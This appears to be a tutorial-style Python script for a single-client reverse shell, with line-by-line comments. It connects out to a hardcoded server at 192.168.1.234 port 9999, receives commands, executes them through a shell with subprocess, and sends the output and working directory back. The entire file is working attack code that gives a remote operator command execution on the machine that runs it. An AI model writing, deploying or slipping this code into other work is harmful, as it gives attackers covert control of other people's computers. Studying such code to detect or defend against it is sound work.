'''
Single client reverse shell

1. Try and connect to our server
2. Wait for server's instructions from send_command
3. Receives the instructions and run them
4. Take the result and send them back to server
'''

import socket
import os
import subprocess

host = '192.168.1.234'
port = 9999
soc = socket.socket()

soc.connect((host, port))

while True:
    # receive data from server as bytes
    data = soc.recv(1024)
    # decodes the data and check if it is cd command
    if data[:2].decode("utf-8") == "cd":
        # changing the directory of the client by fetching data after cd command. such as cd path, here the path.
        os.chdir(data[3:].decode("utf-8"))

    if len(data)>0:
        '''
        Popen will open the terminal
        Here a subprocess will execute the 'data[:].decode("utf-8")' statement. 
        shell=True will give us access to shell commands. stdout for shell output, stdin for shell 
        input and stderr for shell errors.
        '''
        terminal = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, 
        stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        # read the output of the command which is in byte format 
        # terminal.stdout.read() - read the output, terminal.stderr.read() - read the error
        output_byte = terminal.stdout.read() + terminal.stderr.read()
        #converting the output to string 
        output_str = str(output_byte, "utf-8")
        # sending the output_str to server which will be received by conn.recv() function
        # this will show the current working directory like this way: ynouros@yn-pc:
        current_wd = os.getcwd() + ": "
        soc.send(str.encode(output_str+current_wd))
        #showing the output in client's pc (it is optional)
        print(output_str)
